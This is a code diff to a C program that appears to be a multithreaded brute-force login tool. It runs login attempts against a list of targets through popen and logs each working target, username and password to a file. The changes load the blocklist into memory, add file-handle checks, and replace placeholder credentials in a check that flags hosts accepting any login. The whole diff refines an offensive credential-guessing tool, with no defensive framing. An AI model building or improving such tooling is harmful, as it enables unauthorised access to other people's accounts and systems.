@@ -11,19 +11,40 @@ typedef struct {
     char protocol[5];
 } ThreadData;
 
+char **blocklist_data = NULL;
+int blocklist_count = 0;
+
 int is_target_in_blocklist(const char *target) {
-    FILE *blocklist = fopen("blocklist.txt", "r");
-    char line[MAX_LINE];
-    if (!blocklist) return 0;
-    while (fgets(line, sizeof(line), blocklist)) {
-        strtok(line, "\n");
-        if (strcmp(target, line) == 0) {
-            fclose(blocklist);
+    for (int i = 0; i < blocklist_count; i++) {
+        if (strcmp(target, blocklist_data[i]) == 0) {
             return 1;
         }
     }
-    fclose(blocklist);
     return 0;
+}
+
+void load_blocklist() {
+    FILE *blocklist = fopen("blocklist.txt", "r");
+    if (!blocklist) {
+        perror("Failed to open blocklist file");
+        exit(1);
+    }
+
+    char line[MAX_LINE];
+    while (fgets(line, sizeof(line), blocklist)) {
+        blocklist_data = realloc(blocklist_data, (blocklist_count + 1) * sizeof(char *));
+        blocklist_data[blocklist_count] = strdup(line);
+        strtok(blocklist_data[blocklist_count], "\n");  // Remove newline
+        blocklist_count++;
+    }
+    fclose(blocklist);
+}
+
+void free_blocklist() {
+    for (int i = 0; i < blocklist_count; i++) {
+        free(blocklist_data[i]);
+    }
+    free(blocklist_data);
 }
 
 void *try_login(void *arg) {
@@ -62,16 +83,20 @@ void *try_login(void *arg) {
         FILE *cmd_output = popen(command, "r");
         while (fgets(output, sizeof(output), cmd_output)) {
             if (strstr(output, "200 OK") || strstr(output, "202 Accepted")) {
-                if (strcmp(username, "anyuser") == 0 && strcmp(password, "anypassword") == 0) {
+                if (strcmp(username, "1051115544444444444") == 0 && strcmp(password, "8s7d7ds4d44d44dd44") == 0) {
                     is_default_accepted = 1;
                     FILE *blocklist = fopen("blocklist.txt", "a");
-                    fprintf(blocklist, "%s\n", data->target);
-                    fclose(blocklist);
+                    if (blocklist) {
+                        fprintf(blocklist, "%s\n", data->target);
+                        fclose(blocklist);
+                    }
                     break;
                 }
                 FILE *success_log = fopen("successful_logins.txt", "a");
-                fprintf(success_log, "Target: %s, Username: %s, Password: %s\n", data->target, username, password);
-                fclose(success_log);
+                if (success_log) {
+                    fprintf(success_log, "Target: %s, Username: %s, Password: %s\n", data->target, username, password);
+                    fclose(success_log);
+                }
             }
         }
         pclose(cmd_output);
@@ -91,20 +116,22 @@ int main(int argc, char *argv[]) {
         return 1;
     }
 
+    load_blocklist();
+
     char *protocol = argv[1];
     int max_threads = atoi(argv[2]);
     char *targets_file = argv[3];
 
     FILE *targets = fopen(targets_file, "r");
-    char target_line[MAX_LINE];
-
     if (!targets) {
         perror("Failed to open targets file");
+        free_blocklist();
         return 1;
     }
 
     pthread_t threads[max_threads];
     int current_thread = 0;
+    char target_line[MAX_LINE];
 
     while (fgets(target_line, sizeof(target_line), targets)) {
         strtok(target_line, "\n");  // Remove newline
@@ -130,5 +157,6 @@ int main(int argc, char *argv[]) {
     }
 
     fclose(targets);
+    free_blocklist();
     return 0;
 }
